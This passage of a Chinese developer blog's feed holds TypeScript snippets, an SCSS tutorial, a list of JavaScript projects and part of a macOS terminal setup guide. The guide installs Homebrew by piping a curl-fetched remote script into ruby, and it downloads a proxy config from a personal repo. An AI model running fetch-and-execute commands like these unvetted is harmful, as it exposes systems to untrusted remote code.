typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Gender</span> &#123;</span><br><span class="line">  <span class="title class_">Male</span>,</span><br><span class="line">  <span class="title class_">Female</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">gender</span>: <span class="title class_">Gender</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merry</span>(<span class="params">a: Person, b: Person</span>): [<span class="title class_">Person</span>, <span class="title class_">Person</span>] &#123;</span><br><span class="line">  <span class="keyword">if</span> (a.<span class="property">gender</span> !== b.<span class="property">gender</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [a, b];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;性别相同不能结婚&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = &#123; <span class="attr">gender</span>: <span class="title class_">Gender</span>.<span class="property">Male</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> b = &#123; <span class="attr">gender</span>: <span class="title class_">Gender</span>.<span class="property">Male</span> &#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">merry</span>(a, b));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">selectSort</span>(<span class="params">a: <span class="built_in">number</span>[]</span>): <span class="built_in">number</span>[]&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i =<span class="number">0</span>;i&lt;a.<span class="property">length</span>-<span class="number">1</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> minIndex = i;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> j = i+<span class="number">1</span>; j&lt;a.<span class="property">length</span>; j++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(a[j]&lt;a[minIndex])&#123;</span><br><span class="line">        minIndex = j</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> temp = a[minIndex]</span><br><span class="line">    a[minIndex] = a[i]</span><br><span class="line">    a[i] = temp</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="title function_">selectSort</span>([<span class="number">100</span>,<span class="number">4</span>,<span class="number">50</span>,<span class="number">1</span>,<span class="number">3</span>])</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a: <span class="built_in">string</span>, b: <span class="built_in">string</span></span>): <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>): <span class="built_in">number</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a: <span class="built_in">any</span>, b: <span class="built_in">any</span></span>): <span class="built_in">any</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="string">&#x27;frank&#x27;</span>,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">min</span>(<span class="params">a:<span class="built_in">number</span>, b:<span class="built_in">number</span></span>): <span class="built_in">number</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (a &lt; b) &#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = <span class="title function_">min</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SCSS(SASS)入门</title>
      <link href="/Blog/2018/10/22/scss/SCSS(SASS)%E5%85%A5%E9%97%A8/index/"/>
      <url>/Blog/2018/10/22/scss/SCSS(SASS)%E5%85%A5%E9%97%A8/index/</url>
      
        <content type="html"><![CDATA[<h2 id="维基百科"><a href="#维基百科" class="headerlink" title="维基百科"></a>维基百科</h2><p><a href="https://zh.wikipedia.org/wiki/Sass" title="null">https://zh.wikipedia.org/wiki/Sass</a></p><p><a href="https://sass-lang.com/">Sass</a>（英文全称：Syntactically Awesome Stylesheets）</p><p>是一个最初由Hampton Catlin设计并由Natalie Weizenbaum开发的类 CSS 语言。</p><p>发行时间：2007年<br>稳定版本：2016年3月28日</p><p>Sass 十分简洁，语法中几乎不含括号。<br>后来前端工程师表示不含括号看不懂，于是 Sass 的开发者又提供了 Scss，含括号。<br>弱弱的前端工程师终于表示能看懂了。</p><p>Sass的官方解释器是开源的并且用Ruby语言写成，但是也有用PHP、C语言、Java等实现的版本（C语言版本叫做llibSass，Java语言版本叫做JSass）。</p><p>SassScript提供以下功能：变量、嵌套、混入（Mixin）、选择器继承等。</p><h2 id="开始上手-嵌套选择器-变量-mixn-placeholder"><a href="#开始上手-嵌套选择器-变量-mixn-placeholder" class="headerlink" title="#开始上手* #### 嵌套选择器* #### 变量* #### mixn* #### placeholder"></a>#开始上手<br>* #### 嵌套选择器<br>* #### 变量<br>* #### mixn<br>* #### placeholder</h2><h2 id="1-安装和运行"><a href="#1-安装和运行" class="headerlink" title="1.安装和运行"></a>1.安装和运行</h2><p>创建html和sass文件</p><p>但是html并不会直接解析sass文件，所以我们需要工具来转换<del>(不愿意折腾的小伙伴也可以进入 <a href="http://js.jirengu.com/?html,js,output">JsBin</a> 或者 <a href="https://codepen.io/">CodePen</a> 在线体验scss哦</del>)</p><p>首先初始化目录</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">npm</span> init -y</span><br></pre></td></tr></table></figure><p>为了便于配置和打包，我们使用parcel(代替webpack)</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">npm</span> i -D parcel</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npx parcel index.html <span class="regexp">//</span> 会自动安装node-sass</span><br><span class="line"><span class="regexp">//</span> 如果此步出错，请自行搜索错误</span><br></pre></td></tr></table></figure><p><img src="/Blog/2018/10/22/scss/SCSS(SASS)%E5%85%A5%E9%97%A8/index/img.png"></p><h5 id="成功在html使用scss！"><a href="#成功在html使用scss！" class="headerlink" title="成功在html使用scss！"></a>成功在html使用scss！</h5><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// scss文件</span></span><br><span class="line">$<span class="built_in">red</span>: <span class="built_in">red</span>;</span><br><span class="line">h1 &#123;</span><br><span class="line">  <span class="type">color</span>: $<span class="built_in">red</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="嵌套选择器"><a href="#嵌套选择器" class="headerlink" title="嵌套选择器"></a>嵌套选择器</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// 以往的css文件写法</span><br><span class="line">.nav &#123;</span><br><span class="line">  boder: 1px solid red;</span><br><span class="line">&#125; </span><br><span class="line">.nav &gt; ul &#123;</span><br><span class="line">  <span class="built_in">background</span>: green;</span><br><span class="line">&#125;</span><br><span class="line">.nav &gt; ul &gt; <span class="built_in">li</span> &#123;</span><br><span class="line">  <span class="built_in">border</span>: 1px solid blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// scss写法</span><br><span class="line">$<span class="built_in">border</span>-<span class="built_in">width</span>: 1px;</span><br><span class="line">.nav &#123;</span><br><span class="line">  <span class="built_in">border</span>: $<span class="built_in">border</span>-<span class="built_in">width</span> solid red;</span><br><span class="line">  &gt; ul &#123;</span><br><span class="line">    <span class="built_in">background</span>: green;</span><br><span class="line">    &gt; <span class="built_in">li</span> &#123;</span><br><span class="line">      <span class="built_in">border</span>: $<span class="built_in">border</span>-<span class="built_in">width</span> solid blue;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="mixin"><a href="#mixin" class="headerlink" title="mixin"></a>mixin</h2><p><strong>基本用法</strong><br>把一堆共用样式写进一个函数里</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// css写法</span></span><br><span class="line"><span class="selector-class">.nav</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span><br><span class="line">  &gt; <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: green;</span><br><span class="line">    &gt; <span class="selector-tag">li</span> &#123;</span><br><span class="line">       <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">       <span class="comment">// 好大一块相同的css</span></span><br><span class="line">       <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span><br><span class="line">       <span class="attribute">background</span>: red;</span><br><span class="line">       <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">       <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.demo</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line">  <span class="comment">// 好大一块相同的css</span></span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span><br><span class="line">  <span class="attribute">background</span>: red;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// scss写法</span></span><br><span class="line"><span class="variable">$border-width</span>: <span class="number">1px</span>;</span><br><span class="line"><span class="keyword">@mixin</span> publicFn &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span><br><span class="line">  <span class="attribute">background</span>: red;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="variable">$border-width</span> solid red;</span><br><span class="line">  &gt; <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: green;</span><br><span class="line">    &gt; <span class="selector-tag">li</span> &#123;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">      <span class="keyword">@include</span> publicFn;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.demo</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line">  <span class="keyword">@include</span> publicFn;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>高级用法</strong><br>既然是函数，就可以传值进去</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// scss文件</span></span><br><span class="line">$border-width: <span class="number">1</span>px;</span><br><span class="line">@<span class="keyword">mixin</span> borderFn($border-color: red) &#123; <span class="comment">// 也可以设置默认值</span></span><br><span class="line">  border: <span class="number">1</span>px solid $border-color; </span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.nav &#123;</span><br><span class="line">  border: $border-width solid red;</span><br><span class="line">  &gt; ul &#123;</span><br><span class="line">    background: green;</span><br><span class="line">    &gt; li &#123;</span><br><span class="line">      @include borderFn(blue); <span class="comment">// 等同于 border: 1px solid blue;...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="placeholder"><a href="#placeholder" class="headerlink" title="placeholder"></a>placeholder</h2><p>用途和mixin差不多，用于处理大段相同css代码</p><p>当我们使用<code>mixin</code>时。但是我们只写了一次代码，但是页面中却写了很多次，所以我们可以看到<code>include</code>只机械的拷贝了代码，这是<code>mixin</code>的问题，所以发明了<code>placeholder</code>带来更好的体验！</p><p><img src="/Blog/2018/10/22/scss/SCSS(SASS)%E5%85%A5%E9%97%A8/index/img_1.png" alt="重复！"></p><p>现在我们使用<code>placeholder</code><br>简单的把mixin改成%号，<code>include</code>改成<code>extend</code></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$border-width</span>: <span class="number">1px</span>;</span><br><span class="line">%publicFn &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span><br><span class="line">  <span class="attribute">background</span>: red;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="variable">$border-width</span> solid red;</span><br><span class="line">  &gt; <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: green;</span><br><span class="line">    &gt; <span class="selector-tag">li</span> &#123;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">      <span class="keyword">@extend</span> %publicFn;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.demo</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line">  <span class="keyword">@extend</span> %publicFn;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2018/10/22/scss/SCSS(SASS)%E5%85%A5%E9%97%A8/index/img_2.png"></p><p><em>ps：mixin 和 placeholder 区别，minxin可以传参</em></p><h4 id="了解scss这四个基本功能以后，基本已经入门了-等着加工资把😁😁-。"><a href="#了解scss这四个基本功能以后，基本已经入门了-等着加工资把😁😁-。" class="headerlink" title="了解scss这四个基本功能以后，基本已经入门了(等着加工资把😁😁)。"></a>了解scss这四个基本功能以后，基本已经入门了(等着加工资把😁😁)。</h4>]]></content>
      
      
      <categories>
          
          <category> SCSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2018年最值得关注学习的25个JavaScript开源项目</title>
      <link href="/Blog/2018/10/17/essay/2018%E5%B9%B4%E6%9C%80%E5%80%BC%E5%BE%97%E5%85%B3%E6%B3%A8%E5%AD%A6%E4%B9%A0%E7%9A%8425%E4%B8%AAJavaScript%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/index/"/>
      <url>/Blog/2018/10/17/essay/2018%E5%B9%B4%E6%9C%80%E5%80%BC%E5%BE%97%E5%85%B3%E6%B3%A8%E5%AD%A6%E4%B9%A0%E7%9A%8425%E4%B8%AAJavaScript%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/index/</url>
      
        <content type="html"><![CDATA[<p>为大家推荐GitHub上25个今年最值得关注学习的JavaScript开源项目，这些项目的<strong>平均star数达到5000个</strong>。</p><p><strong>No.1</strong></p><p><strong>Prettier</strong>：一款帮你解决代码风格问题的代码格式化工具，功能强大，简单易用，支持多语言，减少配置项。*[GitHub上26755个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/prettier/prettier">github.com&#x2F;prettier&#x2F;pr…</a></p><p><strong>No.2</strong></p><p><strong>Parcel</strong>：运行极快的零配置web应用打包工具。*[GitHub上25811个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/parcel-bundler/parcel">github.com&#x2F;parcel-bund…</a></p><p><strong>No.3</strong></p><p><strong>Prepack</strong>：一款能让JavaScript代码运行速度更快的工具。*[GitHub上12645个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/facebook/prepack">github.com&#x2F;facebook&#x2F;pr…</a></p><p><strong>No.4</strong></p><p><strong>Draggable</strong>：能让你完全控制拖放操作。Draggable将原生的浏览器事件抽象为一个综合性API，能让用户创建自定义拖放操作。*[GitHub上11307个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/Shopify/draggable">github.com&#x2F;Shopify&#x2F;dra…</a></p><p><strong>No.5</strong></p><p><strong>AR.js</strong>：利用ARToolKit在浏览器和移动端实现AR效果。*[GitHub上11102个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/jeromeetienne/AR.js">github.com&#x2F;jeromeetien…</a></p><p><strong>No.6</strong></p><p><strong>js-xlsx</strong>：能够解析和编写多种电子表格格式。*[GitHub上11729个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/SheetJS/js-xlsx">github.com&#x2F;SheetJS&#x2F;js-…</a></p><p><strong>No.7</strong></p><p><strong>Reaction</strong>：用JavaScript编写的由事件驱动的实时反应式商务平台。*[GitHub上7520个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/reactioncommerce/reaction">github.com&#x2F;reactioncom…</a></p><p><strong>No.8</strong></p><p><strong>deeplearn.js</strong>：通过硬件加速的web用机器智能库，TensorFlow.js生态系统的一部分。*[GitHub上7580个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/tensorflow/tfjs-core">github.com&#x2F;tensorflow&#x2F;…</a></p><p><strong>No.9</strong></p><p><strong>Luxon</strong>：一个处理JavaScript中日期和时间的程序库。*[GitHub上5900个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/moment/luxon">github.com&#x2F;moment&#x2F;luxo…</a></p><p><strong>No.10</strong></p><p><strong>Reason</strong>：应用了JavaScript和 OCaml生态系统的简单、快速和安全代码。*[GitHub上6185个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/facebook/reason">github.com&#x2F;facebook&#x2F;re…</a></p><p><strong>No.11</strong></p><p><strong>G 2</strong>：JavaScript语法可视化库。具有高度的实用性和可扩展性。*[GitHub上5707个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/antvis/g2">github.com&#x2F;antvis&#x2F;g2</a></p><p><strong>No.12</strong></p><p><strong>Workbox</strong>：渐进式web应用的JavaScript库合集。*[GitHub上5635个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/GoogleChrome/workbox">github.com&#x2F;GoogleChrom…</a></p><p><strong>No.13</strong></p><p><strong>Tone.js</strong>：在浏览器上创建交互式音乐的web音频框架。*[GitHub上5022个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/Tonejs/Tone.js">github.com&#x2F;Tonejs&#x2F;Tone…</a></p><p><strong>No.14</strong></p><p><strong>Nanoid</strong>：面向JavaScript的唯一字符串ID生成器，具有文件小、安全和对URL友好的特点。*[GitHub上4550个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/ai/nanoid">github.com&#x2F;ai&#x2F;nanoid</a></p><p><strong>No.15</strong></p><p><strong>Lozad.js</strong>：一款高性能、可配置的轻量级加载程序。*[GitHub上4117个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/ApoorvSaxena/lozad.js">github.com&#x2F;ApoorvSaxen…</a></p><p><strong>No.16</strong></p><p><strong>Rythm.js</strong>：一个能让你的网页会跳舞的JavaScript库。*[GitHub上3081个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/Okazari/Rythm.js">github.com&#x2F;Okazari&#x2F;Ryt…</a></p><p><strong>No.17</strong></p><p><strong>Superstruct</strong>：能让你很容易的定义接口，验证JavaScript中的代码等数据。*[GitHub上3398个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/ianstormtaylor/superstruct">github.com&#x2F;ianstormtay…</a></p><p><strong>No.18</strong></p><p><strong>Scrollama</strong>：一个帮你应对滚屏事件的JavaScript库。*[GitHub上3507个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/russellgoldenberg/scrollama">github.com&#x2F;russellgold…</a></p><p><strong>No.19</strong></p><p><strong>Zuck.js</strong>：一个能让你到处添加故事的JavaScript库。*[GitHub上2502个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/ramon82/zuck.js">github.com&#x2F;ramon82&#x2F;zuc…</a></p><p><strong>No.20</strong></p><p><strong>Amplitude.JS</strong>：HTML5 音频播放器，无需环境依赖。*[GitHub上2643个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/521dimensions/amplitudejs">github.com&#x2F;521dimensio…</a></p><p><strong>No.21</strong></p><p><strong>Buttercup</strong>：跨平台的免费开源的密码管理工具。*[GitHub上2243个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/buttercup/buttercup-desktop">github.com&#x2F;buttercup&#x2F;b…</a></p><p><strong>No.22</strong></p><p><strong>Bottender</strong>：帮你快速灵活地构建机器人。*[GitHub上2423个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/Yoctol/bottender">github.com&#x2F;Yoctol&#x2F;bott…</a></p><p><strong>No.23</strong></p><p><strong>Webpackmonitor</strong>：能帮你在开发过程中监控webpack优化指标。*[GitHub上2098个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/webpackmonitor/webpackmonitor">github.com&#x2F;webpackmoni…</a></p><p><strong>No.24</strong></p><p><strong>Nearley</strong>：一款简单快速但强大的JavaScript解析工具箱。*[GitHub上1891个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/kach/nearley">github.com&#x2F;kach&#x2F;nearle…</a></p><p><strong>No.25</strong></p><p><strong>Spacetime</strong>：一款轻量级JavaScript时区库。*[GitHub上1798个star]*</p><p>项目地址： <a href="https://link.juejin.im/?target=https://github.com/spencermountain/spacetime">github.com&#x2F;spencermoun…</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>macOS 命令行基础</title>
      <link href="/Blog/2018/10/11/shell/macOS%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%9F%BA%E7%A1%80/index/"/>
      <url>/Blog/2018/10/11/shell/macOS%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%9F%BA%E7%A1%80/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>用 macOS 的同学按照如下命令做就行了，比 Windows 的 Git Bash 方便很多。</p></blockquote><h2 id="安装命令行工具"><a href="#安装命令行工具" class="headerlink" title="安装命令行工具"></a>安装命令行工具</h2><p>首先你要让命令行翻墙：</p><ol><li><p>如果你有 VPN，直接开启 VPN 即可</p></li><li><p>如果你的是 Shadowsocks，那么你需要按照 <a href="https://jscode.me/t/mac-linux-proxychains-ng/1141" title="null">这篇帖子</a> 让命令行翻墙</p><ol><li><p>安装 homebrew</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/ruby -e &quot;$(curl -fsSL https:/</span><span class="regexp">/raw.githubusercontent.com/</span>Homebrew<span class="regexp">/install/m</span>aster/install)<span class="string">&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>安装 proxychains-ng</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>proxychains-ng</span><br></pre></td></tr></table></figure></li><li><p>配置proxychains-ng</p><ol start="2"><li><p>下载配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/FrankFang/</span>dot-files<span class="regexp">/master/</span>proxychains.conf &gt; ~/.proxychains.conf</span><br></pre></td></tr></table></figure></li><li><p>添加 bash alias，运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> ~/.bashrc; <span class="built_in">echo</span> <span class="string">&#x27;alias pc=&quot;proxychains4 -f ~/.proxychains.conf&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure></li><li><p><code>source ~/.bashrc</code></p></li><li><p>pc git clone xxx 或者 pc brew install xxx ，那么这个命令行就是翻墙的。</p></li></ol></li></ol></li></ol><p>然后就可以安装工具了</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xcode-select --install</span><br><span class="line">如果你是 vpn 就运行：brew install coreutils vim <span class="keyword">node</span> <span class="title">git</span> wget </span><br><span class="line">如果你是 SS 就运行：pc brew install coreutils vim <span class="keyword">node</span> <span class="title">git</span> wget </span><br><span class="line">npm i -g fanyi</span><br></pre></td></tr></table></figure><p>你的 git、node、npm、fanyi 等命令就都有了 :)</p><h2 